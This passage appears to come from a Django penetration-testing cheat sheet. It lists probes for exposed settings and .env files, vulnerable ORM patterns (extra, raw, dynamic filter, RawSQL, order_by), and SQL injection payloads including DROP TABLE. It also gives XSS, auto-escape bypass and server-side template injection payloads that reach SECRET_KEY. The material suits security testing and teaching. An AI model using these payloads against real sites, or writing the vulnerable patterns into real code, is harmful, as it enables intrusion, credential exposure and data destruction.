GET /static/settings.py
GET /static/../settings.py
GET /.env
GET /config/settings.py
{% endraw %}
</settings_exposure>
</fingerprinting>

<orm_injection>
<extra_and_raw>
{% raw %}
# Vulnerable patterns using extra() and raw()

# extra() with user input (deprecated but still seen)
User.objects.extra(where=["username = '%s'" % user_input])

# Injection payload:
user_input = "' OR '1'='1"
user_input = "'; DROP TABLE users; --"

# raw() queries
User.objects.raw("SELECT * FROM auth_user WHERE username = '%s'" % user_input)

# Test with:
# - Single quotes
# - Double dashes (comments)
# - Semicolons (query stacking)
# - UNION SELECT
{% endraw %}
</extra_and_raw>

<filter_injection>
{% raw %}
# Dynamic filter injection
# Vulnerable pattern:
User.objects.filter(**{field_name: value})

# If field_name is user-controlled:
?field_name=password&value=admin
?field_name=is_superuser&value=True

# Field traversal:
?field_name=author__user__password&value=test

# Dangerous lookups:
?field_name=email__regex&value=.*

# JSON field injection:
?field_name=profile__contains&value={"admin": true}
{% endraw %}
</filter_injection>

<rawsql_injection>
{% raw %}
# RawSQL in annotations
from django.db.models.expressions import RawSQL

# Vulnerable:
queryset.annotate(val=RawSQL("SELECT %s" % user_input, []))

# Safe version uses params:
queryset.annotate(val=RawSQL("SELECT %s", [user_input]))

# Test fields that use RawSQL in:
# - ordering
# - annotations
# - aggregations
{% endraw %}
</rawsql_injection>

<order_by_injection>
{% raw %}
# order_by with user input
# Vulnerable pattern:
queryset.order_by(user_input)

# Injection payloads:
?order=-password      # Expose password ordering
?order=CASE WHEN (SELECT ...) THEN 1 ELSE 2 END
?order=1; DROP TABLE users; --

# Test with field names that shouldn't be sortable
{% endraw %}
</order_by_injection>
</orm_injection>

<template_injection>
<auto_escape_bypass>
{% raw %}
# Django auto-escapes by default, but bypasses exist:

# mark_safe() with user input
from django.utils.safestring import mark_safe
mark_safe(user_input)  # VULNERABLE

# |safe filter with user input
{{ user_input|safe }}  # VULNERABLE

# format_html() misuse
format_html("<a href='{}'>{}</a>", user_url, user_input)
# Safe for content, but URL might not be sanitized

# Test payloads:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)  # For URLs
{% endraw %}
</auto_escape_bypass>

<ssti_in_django>
{% raw %}
# Server-Side Template Injection
# Less common in Django but possible:

# User-controlled template content
Template(user_input).render(Context({}))

# Test payloads:
{% templatetag openvariable %}settings{% templatetag closevariable %}
{% load module %}
{{ request.user }}
{{ settings.SECRET_KEY }}

# Django templates are sandboxed, but information disclosure possible
{% endraw %}
</ssti_in_django>

<url_injection>
{% raw %}
# URL-based XSS
# If URLs are rendered unvalidated:

<a href="{{ user_url }}">Link</a>

# Payloads:
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
vbscript:alert(1)

# Test URL fields in forms and redirects
{% endraw %}
</url_injection>
</template_injection>

